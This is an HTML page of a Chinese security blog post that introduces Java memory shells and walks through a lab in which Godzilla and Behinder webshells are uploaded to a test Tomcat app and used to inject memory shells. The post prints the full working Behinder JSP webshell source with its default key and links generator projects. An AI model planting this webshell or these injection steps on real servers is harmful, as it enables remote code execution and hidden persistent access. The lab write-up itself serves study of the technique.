@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Java内存马是一类通过动态注入恶意代码到Java进程内存中，无需落地文件即可实现持久化控制或恶意操作的攻击手段，常见形式包括Filter、Listener、Servlet、Spring Controller&#x2F;Interceptor等，利用Web容器或框架的组件注册机制，通过反射等技术将恶意逻辑嵌入请求处理、事件监听等流程，隐蔽性强且难以通过传统文件检测发现，可实现命令执行、数据窃取、请求篡改等攻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之内存马简介">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/05/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E4%BB%8B/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="Java内存马是一类通过动态注入恶意代码到Java进程内存中，无需落地文件即可实现持久化控制或恶意操作的攻击手段，常见形式包括Filter、Listener、Servlet、Spring Controller&#x2F;Interceptor等，利用Web容器或框架的组件注册机制，通过反射等技术将恶意逻辑嵌入请求处理、事件监听等流程，隐蔽性强且难以通过传统文件检测发现，可实现命令执行、数据窃取、请求篡改等攻">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image.jpg">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017152824392.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017152956071.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017153143421.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017153204817.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017153425256.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017153542127.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017154042175.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017154218762.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017155400492.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251017160344386.png">
+<meta property="article:published_time" content="2025-10-05T09:26:50.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:32:35.139Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image.jpg">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/05/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E4%BB%8B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/05/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E4%BB%8B/","path":"2025/10/05/Java攻防/Java安全之内存马简介/","title":"Java安全之内存马简介"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之内存马简介 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%8D-Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A0%B8%E5%BF%83%E7%89%B9%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">🔍 Java内存马的核心特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9A%99%EF%B8%8F-%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">⚙️ 常见类型与工作原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%BC%94%E7%A4%BA"><span class="nav-number"></span> <span class="nav-text">简单演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="nav-number">2.</span> <span class="nav-text">哥斯拉</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%B0%E8%9D%8EV4-1"><span class="nav-number">3.</span> <span class="nav-text">冰蝎V4.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="nav-number">4.</span> <span class="nav-text">其他工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">内存马生成项目：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F"><span class="nav-number"></span> <span class="nav-text">注意</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/05/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E4%BB%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之内存马简介 | 子非鱼的博客">
+      <meta itemprop="description" content="Java内存马是一类通过动态注入恶意代码到Java进程内存中，无需落地文件即可实现持久化控制或恶意操作的攻击手段，常见形式包括Filter、Listener、Servlet、Spring Controller&#x2F;Interceptor等，利用Web容器或框架的组件注册机制，通过反射等技术将恶意逻辑嵌入请求处理、事件监听等流程，隐蔽性强且难以通过传统文件检测发现，可实现命令执行、数据窃取、请求篡改等攻击目标。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之内存马简介
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-05 17:26:50" itemprop="dateCreated datePublished" datetime="2025-10-05T17:26:50+08:00">2025-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:32:35" itemprop="dateModified" datetime="2025-10-31T17:32:35+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Java内存马是一类通过动态注入恶意代码到Java进程内存中，无需落地文件即可实现持久化控制或恶意操作的攻击手段，常见形式包括Filter、Listener、Servlet、Spring Controller/Interceptor等，利用Web容器或框架的组件注册机制，通过反射等技术将恶意逻辑嵌入请求处理、事件监听等流程，隐蔽性强且难以通过传统文件检测发现，可实现命令执行、数据窃取、请求篡改等攻击目标。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Java内存马（Memory Shell）是一种无文件形式的恶意代码，它直接注入到Java应用程序的内存中运行，通过利用Java Web容器或框架的组件实现隐蔽的远程控制。由于其无文件特性，它能够规避传统的安全检测手段，成为现代攻防对抗中的高级威胁。</p>
+<h3 id="🔍-Java内存马的核心特点">🔍 Java内存马的核心特点</h3>
+<ol>
+<li><strong>​无文件驻留​</strong>​<br>
+内存马完全驻留在JVM内存中，不写入磁盘，因此传统杀毒软件的文件扫描难以检测。</li>
+<li><strong>​高隐蔽性​</strong>​<br>
+通过动态技术植入到Servlet、Filter、Controller等合法组件中，与正常业务代码混合执行，不易被日志或监控发现。</li>
+<li><strong>​持久化能力​</strong>​<br>
+通过修改组件配置或劫持类加载器，确保服务重启后仍能重新激活。例如，在Tomcat中动态注册Filter并映射到全局URL模式。</li>
+<li><strong>​跨平台性​</strong>​<br>
+依赖JVM的跨平台特性，可在Windows、Linux等多种操作系统上运行。</li>
+</ol>
+<h3 id="⚙️-常见类型与工作原理">⚙️ 常见类型与工作原理</h3>
+<p>内存马通常利用漏洞或已有Webshell作为跳板，通过反射机制动态注入恶意组件。以下是主要类型：</p>
+<table>
+<thead>
+<tr>
+<th>​<strong>​类型​</strong>​</th>
+<th>​<strong>​攻击原理​</strong>​</th>
+<th>​<strong>​触发条件​</strong>​</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>​<strong>​Servlet/Filter/Listener型​</strong>​</td>
+<td>篡改Tomcat等容器的组件，例如注册恶意Filter拦截所有请求。</td>
+<td>请求路径匹配预设的URL模式。</td>
+</tr>
+<tr>
+<td>​<strong>​框架型​</strong>​</td>
+<td>针对Spring等框架，动态注册Controller或Interceptor。</td>
+<td>匹配框架路由规则。</td>
+</tr>
+<tr>
+<td>​<strong>​Agent型​</strong>​</td>
+<td>利用Java Agent技术修改已加载类的字节码，Hook关键方法如<code>doFilter</code>。</td>
+<td>类被调用时自动执行恶意逻辑。</td>
+</tr>
+<tr>
+<td>​<strong>​中间件型​</strong>​</td>
+<td>针对Tomcat Valve、WebLogic组件等，在请求处理链中插入恶意模块。</td>
+<td>请求经过中间件处理链。</td>
+</tr>
+<tr>
+<td><img src="/images/image.jpg" alt=""></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>​<strong>​植入流程​</strong>​一般分为三步：</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li><strong>​制作恶意组件​</strong>​：实现Servlet、Filter等接口，重写方法以执行命令。</li>
+<li><strong>​注入内存​</strong>​：通过类加载器加载恶意字节码。</li>
+<li><strong>​模拟注册​</strong>​：获取上下文，将组件绑定到URL路由。</li>
+</ol>
+<h2 id="简单演示">简单演示</h2>
+<h3 id="靶场">靶场</h3>
+<p>准备一个文件上传的靶场, 上传jsp文件<br>
+我的靶场:<a target="_blank" rel="noopener" href="https://gitee.com/zifeiyu-sec/source/blob/master/Java%E5%86%85%E5%AD%98%E9%A9%AC/upload-demo.war">https://gitee.com/zifeiyu-sec/source/blob/master/Java内存马/upload-demo.war</a><br>
+下载后放在tomcat目录webapps下<br>
+<img src="/images/ob-20251017152824392.png" alt=""><br>
+然后启动tomcat,自会生成upload-demo目录, 然后访问8080端口/upload-demo目录<br>
+<img src="/images/ob-20251017152956071.png" alt=""></p>
+<h3 id="哥斯拉">哥斯拉</h3>
+<p>首先以哥斯拉为例, 打开哥斯拉, 生成一个jsp马<br>
+<img src="/images/ob-20251017153143421.png" alt=""><br>
+<img src="/images/ob-20251017153204817.png" alt=""><br>
+生成后保存到本地, 然后上传到靶场<br>
+<img src="/images/ob-20251017153425256.png" alt=""><br>
+可以看到上传成功 ,<br>
+然后添加到哥斯拉<br>
+文件地址:<a target="_blank" rel="noopener" href="http://10.56.93.60:8080/upload-demo/Upload/test.jsp">http://10.56.93.60:8080/upload-demo/Upload/test.jsp</a><br>
+<img src="/images/ob-20251017153542127.png" alt=""></p>
+<p>添加成功后右键进入, 有memoryshell一栏, 即注入内存马<br>
+<img src="/images/ob-20251017154042175.png" alt=""><br>
+点击run后注入.<br>
+然后重新添加一个<br>
+<img src="/images/ob-20251017154218762.png" alt=""><br>
+连接成功即注入成功.</p>
+<h3 id="冰蝎V4-1">冰蝎V4.1</h3>
+<p>webshell如下, 或者选择自带的, 在冰蝎的server目录下, 自带的shell.jsp不适用高版本jdk</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*,java.util.Base64&quot;</span>%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="built_in">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">    String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class="line">    session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">    Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader())</span><br><span class="line">        .g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine())))</span><br><span class="line">        .newInstance()</span><br><span class="line">        .equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>该该文件上传到靶场<br>
+然后使用冰蝎连接, 密码rebeyond<br>
+连接成功后右键注入内存马<br>
+<img src="/images/ob-20251017155400492.png" alt=""></p>
+<p>注入后会自动添加<br>
+发现冰蝎注入后无法建立连接, 可能是没有对应靶场类型的内存马, 内存马分类型. 冰蝎注入的过程如上</p>
+<h3 id="其他工具">其他工具</h3>
+<p><img src="/images/ob-20251017160344386.png" alt=""><br>
+其他工具诸如游魂, 蚁剑等注入内存马效果类似. 蚁剑配合插件使用</p>
+<h3 id="内存马生成项目：">内存马生成项目：</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/ReaJason/MemShellParty">https://github.com/ReaJason/MemShellParty</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">https://github.com/pen4uin/java-memshell-generator</a></p>
+<h2 id="注意">注意</h2>
+<p><strong>注入内存马的前提通常是已经成功获取 WebShell或类似的初始访问权限</strong>, 因为:</p>
+<p>内存马是<strong>直接在服务器内存中注入恶意代码逻辑</strong>（如恶意 Filter、Listener、Servlet 等），它依赖于对服务器运行时环境（如 Java 应用的 <code>ClassLoader</code>、容器上下文等）的访问和操控能力。<br>
+而 WebShell 是 “获取初始访问权限” 的关键：</p>
+<ul>
+<li>它能让攻击者在目标服务器上执行自定义代码（如命令执行、文件操作等）。</li>
+<li>更重要的是，WebShell 提供了与服务器运行时环境交互的入口（比如 JSP WebShell 可直接操作 pageContext、ServletContext 等容器对象）。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/30/Java%E6%94%BB%E9%98%B2/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB%E9%93%BE%E5%88%86%E6%9E%90/" rel="prev" title="反序列化之CB链分析">
+                  <i class="fa fa-angle-left"></i> 反序列化之CB链分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/07/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC1%E9%93%BE%E5%88%86%E6%9E%90/" rel="next" title="Java安全之CC1链分析">
+                  Java安全之CC1链分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
